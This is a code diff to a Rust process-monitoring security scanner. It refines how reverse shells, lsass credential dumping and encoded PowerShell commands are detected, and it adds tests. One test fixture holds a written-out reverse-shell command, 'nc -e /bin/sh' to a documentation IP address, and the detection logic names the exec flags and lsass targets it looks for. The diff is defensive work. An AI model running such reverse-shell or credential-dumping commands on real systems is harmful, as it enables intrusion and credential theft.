@@ -261,6 +261,32 @@ impl ProcessMonitor {
             .output()
             .map_err(|e| crate::error::ScannerError::Command(format!("Failed to run ps: {}", e)))?;
 
+        if !output.status.success() {
+            return Err(crate::error::ScannerError::Command(
+                "Unable to enumerate running processes: ps failed".into(),
+            ));
+        }
+        let arguments = silent_command("ps")
+            .args(["-axo", "pid=,args="])
+            .output()
+            .map_err(|_| {
+                crate::error::ScannerError::Command(
+                    "Unable to collect process command lines".into(),
+                )
+            })?;
+        if !arguments.status.success() {
+            return Err(crate::error::ScannerError::Command(
+                "Unable to collect process command lines: ps failed".into(),
+            ));
+        }
+        let command_lines: std::collections::HashMap<u32, String> =
+            String::from_utf8_lossy(&arguments.stdout)
+                .lines()
+                .filter_map(|line| {
+                    let (pid, command) = line.trim().split_once(char::is_whitespace)?;
+                    Some((pid.parse().ok()?, command.trim().to_owned()))
+                })
+                .collect();
         let stdout = String::from_utf8_lossy(&output.stdout);
         let mut processes = Vec::new();
 
@@ -279,7 +305,7 @@ impl ProcessMonitor {
                     pid,
                     name,
                     path: None,
-                    cmdline: None,
+                    cmdline: command_lines.get(&pid).cloned(),
                     ppid: Some(ppid),
                     user: Some(user),
                 });
@@ -345,7 +371,7 @@ impl ProcessMonitor {
         let name_lower = proc.name.to_lowercase();
         // Get just the executable name without path
         let exe_name = name_lower
-            .rsplit('/')
+            .rsplit(['/', '\\'])
             .next()
             .unwrap_or(&name_lower)
             .to_string();
@@ -354,13 +380,30 @@ impl ProcessMonitor {
         for (pattern, description, incident_type, exact_match) in SUSPICIOUS_PROCESSES {
             let matches = if *exact_match {
                 // Exact match: process name must equal pattern exactly
-                exe_name == *pattern || name_lower == *pattern
+                exe_name.trim_end_matches(".exe") == pattern.trim_end_matches(".exe")
             } else {
                 // Contains match: pattern must be present in name
-                name_lower.contains(pattern)
+                exe_name.contains(pattern)
             };
 
             if matches {
+                // Dual-use tools need execution/target evidence; a diagnostic nc or
+                // an ordinary process dump is not proof of a reverse shell/credential theft.
+                let command = proc.cmdline.as_deref().unwrap_or("").to_lowercase();
+                if *incident_type == IncidentType::ReverseShell {
+                    let tokens: Vec<_> = command.split_whitespace().collect();
+                    let executes = tokens
+                        .iter()
+                        .any(|arg| matches!(*arg, "-e" | "--exec" | "-c" | "--sh-exec"))
+                        || command.contains("exec:")
+                        || command.contains("system:");
+                    if !executes {
+                        continue;
+                    }
+                }
+                if *pattern == "procdump" && !command.contains("lsass") {
+                    continue;
+                }
                 let severity = match incident_type {
                     IncidentType::CryptoMiner => IncidentSeverity::High,
                     IncidentType::Malware => IncidentSeverity::Critical,
@@ -408,9 +451,11 @@ impl ProcessMonitor {
             let cmdline_lower = cmdline.to_lowercase();
 
             // Check for base64 encoded commands (common in malware)
-            if cmdline_lower.contains("-encodedcommand")
-                || cmdline_lower.contains("-enc ")
-                || cmdline_lower.contains("frombase64")
+            if matches!(exe_name.trim_end_matches(".exe"), "powershell" | "pwsh")
+                && (cmdline_lower
+                    .split_whitespace()
+                    .any(|arg| matches!(arg, "-encodedcommand" | "-enc"))
+                    || cmdline_lower.contains("frombase64"))
             {
                 return Some(
                     SecurityIncident::new(
@@ -629,7 +674,7 @@ mod tests {
             pid: 1234,
             name: "nc".to_string(),
             path: Some("/usr/bin/nc".to_string()),
-            cmdline: None,
+            cmdline: Some("nc -e /bin/sh 203.0.113.1 4444".into()),
             ppid: Some(1),
             user: None,
         };
@@ -640,5 +685,25 @@ mod tests {
             "nc exact match should trigger detection"
         );
         assert_eq!(incident.unwrap().incident_type, IncidentType::ReverseShell);
+    }
+    #[test]
+    fn diagnostic_tools_and_search_arguments_do_not_become_malware() {
+        let monitor = ProcessMonitor::new();
+        for (name, command) in [
+            ("nc", "nc -z localhost 8080"),
+            ("socat", "socat TCP:localhost:8000 STDIO"),
+            ("rg", "rg frombase64 -encodedcommand src"),
+            ("procdump", "procdump application.exe"),
+        ] {
+            let process = ProcessInfo {
+                pid: 999,
+                name: name.into(),
+                path: None,
+                cmdline: Some(command.into()),
+                ppid: None,
+                user: None,
+            };
+            assert!(monitor.analyze_process(&process).is_none(), "{command}");
+        }
     }
 }
